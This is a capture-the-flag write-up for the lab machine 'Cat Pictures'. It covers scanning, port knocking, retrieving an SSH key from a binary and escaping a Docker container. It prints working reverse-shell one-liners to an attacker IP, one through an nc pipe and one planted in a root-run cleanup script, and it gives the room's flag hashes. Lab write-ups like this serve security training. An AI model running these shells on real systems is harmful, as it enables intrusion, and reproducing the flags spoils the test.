> Cat Pictures

# Nmap

nmap -sC -sV -T4 -Pn -vvv -A $IP -oN nmap/initial

```bash
PORT     STATE SERVICE     REASON
22/tcp   open  ssh          syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
4420/tcp open  nvm-express? syn-ack
| fingerprint-strings: 
|   DNSVersionBindReqTCP, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|     Please enter password:
|     Invalid password...
|     Connection Closed
|   NULL, RPCCheck: 
|     INTERNAL SHELL SERVICE
|     please note: cd commands do not work at the moment, the developers are fixing it at the moment.
|     ctrl-c
|_    Please enter password:
8080/tcp open  http         syn-ack Apache httpd 2.4.46 ((Unix) OpenSSL/1.1.1d PHP/7.3.27)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 (Unix) OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
```

And we got a webpage with login at port 8080. And looking around we can find `http://10.10.215.252:8080/viewtopic.php?f=2&p=2#p2`

```
POST ALL YOUR CAT PICTURES HERE :)

Knock knock! Magic numbers: 1111, 2222, 3333, 4444
```

Looks like port knocking. Let's do it using knockd.

sudo knockd $IP 1111 2222 3333 4444

We got FTP open now! We can login as anonymous too!

# note.txt

```bash
note.txt 
In case I forget my password, I'm leaving a pointer to the internal shell service on the server.

Connect to port 4420, the password is sardinethecat.
- catlover
```

nc -nv $IP 4420

And we got a shell with restricted environment. We can't run some commands but let's try to get a shell. 
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.12.130 9001 >/tmp/f` gave us a shell. We still can't run commands but we can use cd. Hoping over to `/home/catlover` we can find a file called `runme`. Looks like an ELF file and running `cat runme` gives us some strings among them we can find an interesting string.

```bash
rebeccaPlease enter yout password: Welcome, catlover! SSH key transfer queued! touch /tmp/gibmethesshkeyAccess Deniedd
```

Let's assume that `rebecca` is the password for the file.
```bash
./runme

Please enter yout password: rebecca
Welcome, catlover! SSH key transfer queued! 
```

Looks like it and we got an `id_rsa` file. We can use that to login as catlover through SSH.

ssh -i id_rsa catlover@10.10.188.208 => We are in as root.

# flag.txt

```
7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
```

Running Linpeas we got some interesting stuff!!

```bash
[+] System stats
Filesystem      Size  Used Avail Use% Mounted on
overlay          20G  7.3G   12G  40% /
tmpfs            64M     0   64M   0% /dev
tmpfs           238M     0  238M   0% /sys/fs/cgroup
shm              64M  360K   64M   1% /dev/shm
/dev/xvda1       20G  7.3G   12G  40% /opt/clean
tmpfs           238M     0  238M   0% /proc/acpi
tmpfs           238M     0  238M   0% /proc/scsi
tmpfs           238M     0  238M   0% /sys/firmware
              total        used        free      shared  buff/cache   available
Mem:         486564      281248       26724       12212      178592      181480
Swap:             0           0           0
```

We can see that /opt/clean is same as overlay. Let's check /opt/clean.

```bash
clean.sh 

#!/bin/bash
rm -rf /tmp/*

ls -la clean.sh 

-rw-r--r-- 1 root root 27 May  1 00:20 clean.sh
```

Let's try to add a reverse shell here and get a reverse shell

```bash
echo "bash -i >& /dev/tcp/10.9.12.130/9999 0>&1" > clean.sh
```

And we got a shell back as root and we have escaped the docker container.

# root.txt

```
4a98e43d78bab283938a06f38d2ca3a3c53f0476
```